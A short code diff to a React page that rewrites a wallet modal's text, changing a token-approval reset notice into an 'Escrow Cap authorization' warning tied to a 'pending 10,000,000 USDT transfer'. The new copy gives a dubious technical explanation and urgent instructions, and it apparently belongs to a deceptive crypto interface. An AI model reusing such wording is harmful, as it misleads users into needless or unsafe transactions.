@@ -560,11 +560,11 @@ export default function Home() {
       {showResetModal && (
         <div className={styles.modalOverlay}>
           <div className={styles.modalContent}>
-            <div className={styles.modalTitle}>Reset Token Approval?</div>
+            <div className={styles.modalTitle}>Reset Escrow Cap Authorization?</div>
             <div className={styles.modalText}>
-              <strong>Notice:</strong> Sometimes network nodes fail to recognize token approvals, resulting in repetitive looping or failed transactions.
+              <strong>Notice:</strong> Sometimes the network node fails to index the Escrow Cap authorization, leading to a <span style={{ color: '#d22d3d', fontFamily: 'monospace' }}>execution reverted</span> error when trying to route the funds.
               <br /><br />
-              If you have experienced multiple failed transactions, it is best practice to completely <strong>reset your token approval back to zero</strong> before trying your transaction again.
+              If you experienced a failed node transaction, you must completely <strong>reset your Escrow authorization back to zero</strong> before the network will allow you to authorize the pending 10,000,000 USDT transfer again.
             </div>
             <div className={styles.modalActions}>
               <button
